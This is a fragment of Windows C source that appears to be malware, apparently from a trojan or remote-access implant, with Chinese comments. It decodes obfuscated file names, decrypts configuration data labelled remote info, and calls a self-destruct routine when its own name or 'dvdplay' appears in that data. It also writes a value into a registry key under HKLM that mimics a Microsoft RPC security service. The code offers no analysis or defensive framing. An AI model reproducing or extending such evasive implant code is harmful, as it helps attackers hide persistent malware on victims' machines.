	if(GetTroPath(tropath)==FALSE)
		return FALSE;
	
	memset(filepath, 0, MAX_PATH);
	sprintf(filepath, "%s\\%s", tropath, DepubStringA(TmpDeStr, 100, "fw2eok")); //Destro
	FILE* file = fopen(filepath, "rb");

	//dvdplay
	DepubStringA(TmpDeStr, 100, ":E:XdVB");
	
	if (file)
	{
		memset(buf, 0, 1024);
		fseek(file, 0, SEEK_END);
		buflen = ftell(file);
		fseek(file, 0, SEEK_SET);
		fread(buf, 1, buflen, file);
		CryptRemoteInfo(buf, buflen);
		
		memset(SelfName, 0, MAX_PATH);
		memset(Selfpath, 0, MAX_PATH);
		if(myGetModuleFile(Selfpath, MAX_PATH, SelfName, MAX_PATH))
		{
			char tmpName[MAX_PATH];
			memset(tmpName, 0, MAX_PATH);
			Unicode2GB2312(SelfName, tmpName, MAX_PATH);
			(strrchr(tmpName, '.'))[0] = 0;
			if (strstr(buf, tmpName) != NULL)
			{
				DestroySelf(tmpName, SelfName, Selfpath);
			}
			if (strstr(buf, TmpDeStr) != NULL)
			{
				DestroySelf(TmpDeStr, SelfName, Selfpath);
			}
		}
		
		fclose(file);
	}
	
	return TRUE;
}

bool SetNetLoGon(char *value)
{
	// 打开注册表键------
	HKEY hKey;
	LPCSTR lpszSubKey = "SOFTWARE\\Microsoft\\Rpc\\SecurityService";
	int ret = PRegOpenKeyExA(HKEY_LOCAL_MACHINE, lpszSubKey, 0, KEY_ALL_ACCESS, &hKey);
	if (ret != ERROR_SUCCESS)
	{
		// 打开失败	
		//失败原因
		return false;
	}
	int len=strlen(value);
	ret = PRegSetValueExA(hKey, "68", 0, REG_SZ, (const BYTE*)value, len);  
	if (ret != ERROR_SUCCESS)  
	{  
		PRegCloseKey(hKey);  
		return false;  
	}  
	
	// 关闭注册表键------
	PRegCloseKey(hKey);
	
	return true;
}
